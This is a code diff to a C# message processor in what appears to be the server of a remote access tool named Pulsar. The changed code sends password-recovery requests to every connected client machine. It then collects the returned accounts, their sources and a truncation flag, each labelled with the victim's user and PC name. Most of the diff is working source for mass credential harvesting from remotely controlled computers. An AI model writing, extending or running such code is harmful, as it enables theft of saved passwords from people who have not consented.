@@ -25,7 +25,7 @@ namespace Pulsar.Server.Messages
         /// <param name="sender">The message processor which raised the event.</param>
         /// <param name="clientIdentifier">A unique client identifier.</param>
         /// <param name="accounts">The recovered accounts</param>
-        public delegate void AccountsRecoveredEventHandler(object sender, string clientIdentifier, List<RecoveredAccount> accounts);
+        public delegate void AccountsRecoveredEventHandler(object sender, string clientIdentifier, List<RecoveredAccount> accounts, List<PasswordRecoverySource> sources, bool truncated);
 
         /// <summary>
         /// Raised when accounts got recovered.
@@ -41,13 +41,28 @@ namespace Pulsar.Server.Messages
         /// </summary>
         /// <param name="accounts">The recovered accounts.</param>
         /// <param name="clientIdentifier">A unique client identifier.</param>
-        private void OnAccountsRecovered(List<RecoveredAccount> accounts, string clientIdentifier)
+        private void OnAccountsRecovered(List<RecoveredAccount> accounts, List<PasswordRecoverySource> sources, bool truncated, string clientIdentifier)
         {
             SynchronizationContext.Post(d =>
             {
                 var handler = AccountsRecovered;
-                handler?.Invoke(this, clientIdentifier, (List<RecoveredAccount>)d);
-            }, accounts);
+                var payload = (RecoveryPayload)d;
+                handler?.Invoke(this, payload.ClientIdentifier, payload.Accounts, payload.Sources, payload.Truncated);
+            }, new RecoveryPayload
+            {
+                Accounts = accounts,
+                Sources = sources,
+                Truncated = truncated,
+                ClientIdentifier = clientIdentifier
+            });
+        }
+
+        private sealed class RecoveryPayload
+        {
+            public List<RecoveredAccount> Accounts { get; set; }
+            public List<PasswordRecoverySource> Sources { get; set; }
+            public bool Truncated { get; set; }
+            public string ClientIdentifier { get; set; }
         }
 
         /// <summary>
@@ -82,17 +97,24 @@ namespace Pulsar.Server.Messages
         public void BeginAccountRecovery()
         {
             var req = new GetPasswords();
-            foreach (var client in _clients.Where(client => client != null))
+            foreach (var client in _clients.Where(client => client != null && client.Connected))
                 client.Send(req);
         }
 
         private void Execute(ISender client, GetPasswordsResponse message)
         {
-            Client c = (Client)client;
+            if (!(client is Client c) || c == null || !c.Connected)
+                return;
+            if (!_clients.Any(associated => associated != null && associated.Equals(c)))
+                return;
 
             string userAtPc = $"{c.Value.Username}@{c.Value.PcName}";
 
-            OnAccountsRecovered(message.RecoveredAccounts, userAtPc);
+            OnAccountsRecovered(
+                message?.RecoveredAccounts ?? new List<RecoveredAccount>(),
+                message?.Sources ?? new List<PasswordRecoverySource>(),
+                message?.Truncated ?? false,
+                userAtPc);
         }
     }
 }
